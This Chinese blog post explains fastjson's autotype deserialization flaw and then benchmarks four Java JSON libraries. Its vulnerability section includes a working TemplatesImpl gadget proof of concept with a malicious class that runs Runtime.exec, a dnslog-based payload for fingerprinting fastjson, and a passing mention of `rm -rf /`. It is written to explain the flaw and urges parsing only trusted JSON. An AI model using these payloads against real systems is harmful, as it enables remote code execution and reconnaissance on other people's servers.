# fastjson漏洞与Json框架性能比较

网上一直传着fastjson漏洞真多，不要用了之类的话题，但是到底是啥漏洞呢？所谓知己知彼，百战不殆，今天我们就来看一下到底是啥漏洞，是不是真的不能用了，最后再对比一下各JSON框架的性能。看看fastjson是不是真的fast!

## Fastjson漏洞问题

在不知道哪个版本时，fastjson新增了一个功能: autotype， 从此fastjson高危漏洞频出，fastjson开始了他的修复bug之路。我们现在就来看看autotype这个功能是什么吧

### 例子

编写`FastUser`用于测试

```java
public class FastUser implements Serializable {

    private String name;

    public FastUser() {
        System.out.println("FastUser.FastUser");
    }

    public String getName() {
        System.out.println("FastUser.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("FastUser.setName");
        this.name = name;
    }
}
```

编写测试代码

```java
@Test
public void testAutoTypeParse(){
  String userJson = "{\"@type\":\"com.my.demo.json.FastUser\",\"name\":\"liaozijian\"}";
  final JSONObject jsonObject = JSON.parseObject(userJson);
  System.out.println(jsonObject);
}
```

> 这里fastjson会自动解析userJson的类型为User， 如果调用的是JSON.parse方法会返回一个User对象

运行结果

```
FastUser.FastUser
FastUser.setName
FastUser.getName
{"name":"liaozijian"}
```

重点来了：根据打印结果，我们发现，fastjson在解析时调用了User的构造方法以及所有的get set方法, 那这个跟高危漏洞有啥关系呢？

如果我们依赖的包或者jdk里面有一个这样的类：在执行构造方法时，会执行一些危险的操作，比如调用我们的操作系统。如果调用操作系统时是用的我们传入的指令，那就更危险了。

所以攻击手段很明确了：找一个这样的类，并且编写好需要操作的指令，构建一个json字符串，传给fastjson解析，fastjson解析时，调用这个类的构造方法或者getset方法，调用我们编写的操作指令，攻击操作系统。

### attack

我在网上就找到了历史漏洞中的一个案例， 在第三方包中有个类为`TemplatesImpl`，就非常符合我们的需求。而且这个类更牛逼， 他能根据我们传入的class字节码，创建一个对象出来，当然，它规定了这个对象必须是`AbstractTranslet`的子类

fastjson版本：1.2.22

编写代码

```java
public class MyTranslet extends AbstractTranslet {
    public MyTranslet() throws IOException {
        Runtime.getRuntime().exec("/usr/bin/touch /tmp/aaabbb.txt");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

> 在构造方法中执行一个touch命令，因为是我自己的电脑，可不敢玩`rm -rf /`

尝试attack

```java
@Test
public void testAttack(){
  // calss路径
  final String evilClassPath = "/Users/liaozijian/my-project/json-compare-demo/MyTranslet.class";
  // 读取class字节码
  String evilCode = readClass(evilClassPath);
  // 供fastjson解析的类
  final String tempClass = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
  // 构建一个攻击的json字符串
  String json = "{\"@type\":\"" + tempClass +
    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
    "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
  // fastjson解析
  JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
}


public String readClass(String path){
  final byte[] bytes = FileUtil.readBytes(path);
  return Base64.encode(bytes);
}
```

运行测试

```java
@Test
public void findFile(){
  String path = "/tmp/aaabbb.txt";
  // 攻击前判断有没有文件
  System.out.println(FileUtil.exist(path));
  try{
    testAttack();
  }catch (Throwable ignore){}
  // 攻击后判断有没有文件
  System.out.println(FileUtil.exist(path));
}
```

![](https://notes.zijiancode.cn/fastjson/attack.png)

> /tmp下多了个文件

经过测试，这个攻击确实是有效的，但是这个漏洞被修复了，其实所谓修复，就是fastjson把这个类加到了黑名单上，这个类不能再使用autotype机制了。后续的基本上的修复都是加黑名单。

直到1.2.7x的版本，增加了一个safemode配置，配上之后，将会禁止autotype的使用。当然，这个配置是否又能被绕过，未来的事情谁也说不准。

### 分析

现在我想大家已经明白这个攻击方式了，反过来想一下，只要我们不要去解析其他地方传过来的json字符串，只解析我们信任的json字符串，不就行了吗~

经常看到同事这样写接口

```java
@PostMapping
public void get(@RequestBody String json){
  JSONObject o = JSON.parseObject(json);
}
```

> 不被攻击才怪呢！



### 自我催眠

我知道，肯定有人想着：虽然我就是这样用了，但别人也不知道我用了fastjson呀，他怎么知道我这个接口是怎么写的呢。

嘿！探测一个系统有没有使用fastjson可是有各种各样的方法哦，现在我来演示一种通过dnslog判断的方式

dnslog: http://www.dnslog.cn/

麻烦小伙伴打开网站，我先介绍一下怎么使用它

![](https://notes.zijiancode.cn/fastjson/dnslog.png)

先获取一个子域名，然后我们在终端ping一下它

点击`Refresh Record`刷新一下

![](https://notes.zijiancode.cn/fastjson/log.png)

可以看到多了一行记录。

那么我们怎么通过这个方式进行探测系统有没有使用 fastjson呢？

直接上代码吧

```java
@Test
public void testFindFastjson(){
  String urlJson = "{{\"@type\":\"java.net.URL\",\"val\":\"http://2nwe4p.dnslog.cn\"}:\"x\"}";
  JSON.parseObject(urlJson);
}
```

重新获取一个子域名，运行以上代码，依旧是利用fastjson解析URL，然后URL会去调用dnslog

运行之后查看dnslog

![](https://notes.zijiancode.cn/fastjson/fastjsonlog.png)

> 可以看到出现记录了。

所以说千万不要自欺欺人，网上已经有各种各样探测系统中有没有使用fastjson的方式了。

## 性能比较

fastjson的漏洞就讲到这，接下来我们来比较一下市面上的json框架的性能

编写测试代码

```java
@Test
public void compare() throws JsonProcessingException {
  for (int i = 0; i < 10; i++) {
    doCompare();
    System.out.println("============分隔=============");
  }
}

private void doCompare() throws JsonProcessingException {
  User user = new User();
  user.setName("liaozijian");
  user.setAge(18);
  user.setGender("man");
  final String userJson = JSON.toJSONString(user);

  int times = 100000;
  StopWatch stopWatch = new StopWatch();
  stopWatch.start("fastjson");
  for (int i = 0; i < times; i++) {
    JSON.toJSONString(user);
  }
  for (int i = 0; i < times; i++) {
    JSON.parseObject(userJson, User.class);
  }
  stopWatch.stop();
  stopWatch.start("hutool-json");
  for (int i = 0; i < times; i++) {
    JSONUtil.toJsonStr(user);
  }
  for (int i = 0; i < times; i++) {
    JSONUtil.toBean(userJson, User.class);
  }
  stopWatch.stop();
  stopWatch.start("gson");
  Gson gson = new Gson();
  for (int i = 0; i < times; i++) {
    gson.toJson(user);
  }
  for (int i = 0; i < times; i++) {
    gson.fromJson(userJson, User.class);
  }
  stopWatch.stop();

  stopWatch.start("jackson");
  ObjectMapper objectMapper = new ObjectMapper();
  for (int i = 0; i < times; i++) {
    objectMapper.writeValueAsString(user);
  }
  for (int i = 0; i < times; i++) {
    objectMapper.readValue(userJson, User.class);
  }
  stopWatch.stop();
  System.out.println(stopWatch.prettyPrint());
}
```

结果：

```
---------------------------------------------
ns         %     Task name
---------------------------------------------
389492986  013%  fastjson
1658112954  056%  hutool-json
393096560  013%  gson
540225867  018%  jackson

============分隔=============
StopWatch '': running time = 1320032456 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
041663258  003%  fastjson
760527749  058%  hutool-json
332420534  025%  gson
185420915  014%  jackson

============分隔=============
StopWatch '': running time = 862732773 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
069278764  008%  fastjson
571310052  066%  hutool-json
133468248  015%  gson
088675709  010%  jackson

============分隔=============
StopWatch '': running time = 761390150 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
034369562  005%  fastjson
509722747  067%  hutool-json
130381711  017%  gson
086916130  011%  jackson

============分隔=============
StopWatch '': running time = 769008432 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
034935590  005%  fastjson
492950297  064%  hutool-json
138608366  018%  gson
102514179  013%  jackson

============分隔=============
StopWatch '': running time = 734202728 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
031490240  004%  fastjson
474673774  065%  hutool-json
131661852  018%  gson
096376862  013%  jackson

============分隔=============
StopWatch '': running time = 826954423 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
032605105  004%  fastjson
567946627  069%  hutool-json
135539420  016%  gson
090863271  011%  jackson

============分隔=============
StopWatch '': running time = 790975074 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
033008699  004%  fastjson
526688299  067%  hutool-json
140946993  018%  gson
090331083  011%  jackson

============分隔=============
StopWatch '': running time = 940702193 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
033711289  004%  fastjson
690345465  073%  hutool-json
129890449  014%  gson
086754990  009%  jackson

============分隔=============
StopWatch '': running time = 839759121 ns
---------------------------------------------
ns         %     Task name
---------------------------------------------
036016276  004%  fastjson
531465457  063%  hutool-json
186995739  022%  gson
085281649  010%  jackson
```

> 除了第一次因为系统没预热，剩余9次比较确实是fastjson遥遥领先

综上来看， 性能的排名为： fastjson > jackson > gson > hutool-json

fastjson的fast确实当之无愧！

## 框架选型

综合以上的情况

鄙人的看法：抛开漏洞不说，fastjson确实牛逼，当然这个漏洞其实真的也没啥，别乱写代码就好，保证解析的json字符串是可信的。

然后是jackson和gson，但这俩不提供JSONObject，就很痛苦。

hutool-json: 说实话，我测试前知道它性能应该没那么好，但也没想到...， 不过这玩意好就好在没啥漏洞，api操作起来也十分的舒服。

**偷偷逼逼一句**：jackson其实也有autotype的功能，一般来说fastjson出现的高危漏洞，jackson也有，但是为啥fastjson老是站在风尖浪口俺就不晓得了。
